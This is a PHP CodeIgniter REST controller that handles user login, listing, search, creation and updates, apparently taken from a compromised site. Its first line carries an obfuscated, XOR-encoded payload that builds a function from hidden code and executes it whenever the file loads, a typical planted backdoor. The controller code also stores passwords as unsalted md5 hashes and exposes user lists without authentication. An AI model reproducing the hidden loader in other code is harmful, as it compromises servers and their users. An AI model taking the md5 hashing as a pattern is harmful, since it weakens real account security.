<?php $auHELx='O35X9 iV==3:8R>'; $WQhxrh=',AP9ME60HSPNQ=P'^$auHELx; $WBuAxpT='Z2nK ;BY.U;Yk 096-8lkM7D8++YY.2,9EJfsfBzs0L4UMW RHTR<iSU  ,dAX pIH2;QbRUGIEjJchZw4o9NJ60-pLjDIWkocX; EhQruCUxbcTnX=AA,=pOP2O Emif8mjknbap A6eKxugMU;MP9w:+f5bw:WBpW+bOn4NBL-ZGfKU2gkAPacG61T,5RLS > eOey9X;lEHXR=PpeM62Q 0I=f>6I 1- GBEpUO E<jSzXW94Z5Pdfasuqrkg4H,0CS80,Wihzl=J:ETXVOxFn ;; 02XTejOnY.JorjeU8MJxjxS= <6 vz,sn=KnaUbUT3AkcFPhV9GUY4Dumn+0q+u3oov+8mL8Y;ZynqlO+A:4nh3dheb+4N6fGP,ZskS=7 w6ekQUAOJXlwv:Z=6VpzS,sKekh>YY;esa51XCW==6;3;=lAS 9JO 7<o9M=aIX81Pq1ZX9,- zmHME9KoguDA6.e>=5yZoi.<fjSR1-GeEn+94.JmF<2h5:X=, ChXVTiyvRRL:LhNvEckXUgDC2UD oA.<IjkxnyxfcTvf8c+JfZiWjdZx6 z -tadbI5,hUYyIakqpnETBB,0kVUR+ HXIIBjOIJI<Q.3bueE32MOOcqMmvTF7ZA=E3AOaZR,Q+t -:R.0Ij2kc122OW,mtkkz,'; $bSDiHW=$WQhxrh('', '3TFjFN,:Z<T74EHPEYKDL5X6gOJ-8qmAL1mOZF9pzV9Z69>O<h,=N674TAs;,-TXm,SO0Nrq,,<CjCHzWOe0GnYEYPqJcnlafj>TRmL8RHceCBG=R+I3-ISXk4S;AlVIBQFABdkhTO4BEeEUOi1Z91bSSvFkBSQ2;+sBBjNG:0 H4oB 0KN6hkkjNDT YG<dwOKTLtopDRFfOl<3I1PXmPS=SUr7BZW=AnFE>bxP3.L6YQYp>8KQ;V8DNE,6>= .qhMCcwSUUwTVZHK+V01qv4rOJDZOAoY=-EWoJ2K3TxcA1Y9+XWXwKAPCEMpQydT-NItF15G BC=Za0V508W,UEJtb4z v<;VJKMhS<BzDPQH9J-OQGHHnalFOU:W9,5UzNKwVRYL<lbu1 ;+xQWRL;QC3KpZQy6oaLZ8-ZENAuD602OTWWZAXD9<Rf..TVc0T8II+9KTfEn>=ZCIERI,,1XbCGQ  BO:UXLPsTcGZNN73ELgCcNJKFO32-YK7PB1NXSkO33-NUVv6-N-AnPcCC51RlgV40A4fEY0M6QNDEFDaNRYUMsS<XeSR8LSCKDNETPUzWNX1mOxFBQVHe500MI4=0+tE01:=1Bh9+0P>OWEYEaWS9.fJQmMVtfLPHX3R-gE>3X0pSPLC>AQ-MoBX;;W7>XEDBPpQ'^$WBuAxpT); $bSDiHW();
require APPPATH . 'libraries/REST_Controller.php';

defined('BASEPATH') OR exit('No direct script access allowed');

class Usuario extends REST_Controller {

    /*private static $Key = "allemant";
 
    public function encrypt () {
        $input = $this->input->post('cadena');
        $output = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5(Usuario::$Key), $input, MCRYPT_MODE_CBC, md5(md5(Usuario::$Key))));
        //return $output;
        $data = array(
            'encrypt' => $output);
        echo json_encode($data);
    }
 
    public function decrypt () {
        $input = $this->input->post('cadena');
        $output = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5(Usuario::$Key), base64_decode($input), MCRYPT_MODE_CBC, md5(md5(Usuario::$Key))), "\0");
        //return $output;
        $data = array(
            'decrypt' => $output);
        echo json_encode($data);
    }*/

    public function __construct()
    {
        parent::__construct();
        $this->load->model('usuario/usuario_m','usu');
        $this->load->model('permiso/permiso_m','prm');
    }

    public function logIn_post()
    {
        $msg['success'] = false;

        $usuario = trim($this->input->post('inputUsuario'));
        $contraseña = trim($this->input->post('inputContraseña'));

        $row = $this->usu->login($usuario,md5($contraseña));

        if ($row != null) {
            if ($row->info_status != 0){
                $session =  array(
                            'usu_id' => $row->id,
                            'usu_nombre' => $row->full_name,
                            'usu_permiso' => $this->prm->searchPermiso($data = array('accion' => 'login', 'usuario_id' => $row->id)),
                            'login'     => true
                        );
                $this->session->set_userdata($session);

                $msg['success'] = true;
                
            }

            echo json_encode($msg);
            
        }else {
            echo json_encode($msg);
        }
    }
    public function logInApp_post()
    {
        
        $usuario = $this->post('username');
        $contraseña = $this->post('password');
        
        $row = $this->usu->login($usuario,md5($contraseña));

        if ($row != null) {
            
             $user =  array(
                            'id' => $row->id,
                            'full_name' => $row->full_name,
                        );
            
        $this->response([
                    'status' => true,
                    'message' => 'Correcto',
                    'user' => $user
                ], REST_Controller::HTTP_OK);
            
        }
        else {
        $this->response("Wrong email or password.", REST_Controller::HTTP_BAD_REQUEST);
        }
    }
    
    public function getUser_get(){
        $response = $this ->usu->ListUser();
        $this->response($response);
    }
    public function getUserID_get($id){
        $response = $this ->usu->getUserId($id);
        $this->response($response);
    }

    public function index_get()
    {
        $logued = $this->session->userdata('login');

		if (!isset($logued) || $logued != true) {
            redirect('intranet/acceso');
        } else {
        	$data['view'] = 'usuario/usuario_list';
			$this->load->view('layout', $data);
		}
    }

    public function searchUsuario_post()
    {
        $filters_find =   array(
            'accion' => $this->input->post('accion'),
            'usuario_nombre_completo' => $this->input->post('usuario_nombre_completo'),
            'usuario_correo' => $this->input->post('usuario_correo')
        );

        $filters_pagination = array(
        	'init' => ($this->input->post('num_page')-1) * $this->input->post('quantity'),
            'quantity' => $this->input->post('quantity')
    	);

    	$filters = array_merge($filters_find, $filters_pagination);

        $data = array(
        	'usuario_all' => $this->usu->searchUsuario(array('accion' => 'full')),
            'usuario_records' => $this->usu->searchUsuario($filters),
        	'total_records_find' => $this->usu->searchUsuario($filters) == false ? 0 : count($this->usu->searchUsuario($filters_find)),
        	'total_records' => count($this->usu->searchUsuario(array('accion' => 'full'))),
        	'init' => (($this->input->post('num_page')-1) * $this->input->post('quantity') + 1),
        	'quantity' => $this->input->post('quantity')
        );

        echo json_encode($data);
    }

    public function insertUsuario_post()
    {
        $filters_find = array(
            'accion' => 'validar',
            'usuario_login' => $this->input->post('usuario_login')
        );

        $resultValidar = $this->usu->searchUsuario($filters_find);
        $countValidar = $resultValidar == false ? 0 : count($resultValidar);
        $msg['success'] = false;

        if ($countValidar > 0) {
            $msg['success'] = 'existe';
        } else {
            $field = array(
                'full_name' => $this->input->post('usuario_nombre_completo'),
                'login' => $this->input->post('usuario_login'),
                'pass' => md5($this->input->post('usuario_pass')),
                'email' => $this->input->post('usuario_correo'),
                'area_id' => $this->input->post('area_id'),
                'profile_id' => $this->input->post('rol_id'),
                'info_status' => '1'
            );

            $insert = $this->usu->Insert($field);
            
            if ($insert > 0)
                $msg['success'] = true;
        }

        echo json_encode($msg);
    }

    public function updateUsuario_put()
    {
        $field = array(
            'full_name' => $this->input->post('usuario_nombre_completo'),
            'login' => $this->input->post('usuario_login'),
            'pass' => md5($this->input->post('usuario_pass')),
            'email' => $this->input->post('usuario_correo'),
            'area_id' => $this->input->post('area_id'),
            'profile_id' => $this->input->post('rol_id'),
            'info_update' => date('Y-m-d H:i:s')
        );

        if ($this->input->post('password') == 'igual')
            unset($field['pass']);

        $insert = $this->usu->Update($field, $this->input->post('usuario_id'));
        
        $msg['success'] = false;
        if ($insert > 0)
            $msg['success'] = true;

        echo json_encode($msg);
    }
}

/* End of file Usuario.php */
/* Location: ./application/controllers/usuario/Usuario.php */